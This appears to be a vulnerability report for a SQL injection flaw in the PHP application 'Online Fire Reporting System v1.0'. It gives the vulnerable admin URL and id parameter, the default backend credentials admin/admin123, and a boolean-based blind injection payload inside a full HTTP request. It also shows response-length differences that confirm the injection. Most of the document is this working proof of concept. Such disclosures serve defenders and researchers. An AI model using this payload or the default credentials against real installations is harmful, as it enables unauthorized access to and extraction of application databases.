# Online Fire Reporting System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15346/online-fire-reporting-system-phpoop-free-source-code.html

Vulnerability File: /ofrs/admin/?page=teams/view_team&id=

Vulnerability location: /ofrs/admin/?page=teams/view_team&id=, id

Current database name: ofrs_db,length is 7

[+] Payload: /ofrs/admin/?page=teams/view_team&id=2%27%20and%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /ofrs/admin/?page=teams/view_team&id=2%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 6, Content-Length: 27983
![image](https://user-images.githubusercontent.com/54017627/170817064-036696f4-3d05-4190-ad91-c3bce72ad484.png)

![image](https://user-images.githubusercontent.com/54017627/170817085-cf587744-0952-4ac6-bd75-37187b57b6ab.png)

When length (database ()) = 7, Content-Length: 27927
![image](https://user-images.githubusercontent.com/54017627/170817056-2baeb423-543b-4fc9-901b-cfc3c33563c8.png)

![image](https://user-images.githubusercontent.com/54017627/170817072-0e37ee2c-815a-448c-afff-ab39385ee115.png)
